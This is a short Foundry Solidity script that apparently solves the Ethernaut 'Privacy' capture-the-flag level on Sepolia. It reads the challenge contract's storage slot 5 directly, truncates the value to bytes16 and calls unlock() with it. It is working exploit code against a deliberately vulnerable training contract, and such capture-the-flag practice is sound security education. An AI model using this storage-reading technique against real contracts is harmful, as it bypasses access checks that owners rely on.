//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/utils/SepoliaInstances.sol";

interface IPrivacy{
    function unlock(bytes16) external;
}



contract PrivacySolutionScript is Script, SepoliaInstances{
    function run() public {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        bytes32 valueSlot5 = vm.load(address(privacyInstance), bytes32(uint256(5)));

        IPrivacy(privacyInstance).unlock(bytes16(valueSlot5));
        
        vm.stopBroadcast();
    }
}